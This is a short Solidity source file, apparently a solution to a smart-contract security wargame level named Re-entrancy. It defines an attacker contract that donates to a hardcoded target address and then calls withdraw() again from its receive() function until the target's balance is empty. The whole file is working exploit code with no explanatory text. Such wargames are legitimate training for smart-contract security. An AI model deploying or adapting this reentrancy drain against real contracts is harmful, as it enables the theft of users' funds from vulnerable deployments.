// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IReentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
}

contract E10_ReEntrancy {
    IReentrance TARGET = IReentrance(0x9B82e0300B6aC1E1796801bd1fDBC9Fb85320094);

    constructor() payable {
    }

    function donate() external {
        TARGET.donate{value: 0.001 ether}(address(this));
    }

    function balanceOfEOA() external view returns(uint) {
        return TARGET.balanceOf(msg.sender);
    }

    function balanceOfContract() external view returns(uint) {
        return TARGET.balanceOf(address(this));
    }

    function withdraw() public {
        TARGET.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(TARGET).balance > 0) {
            withdraw();
        }
    }
}

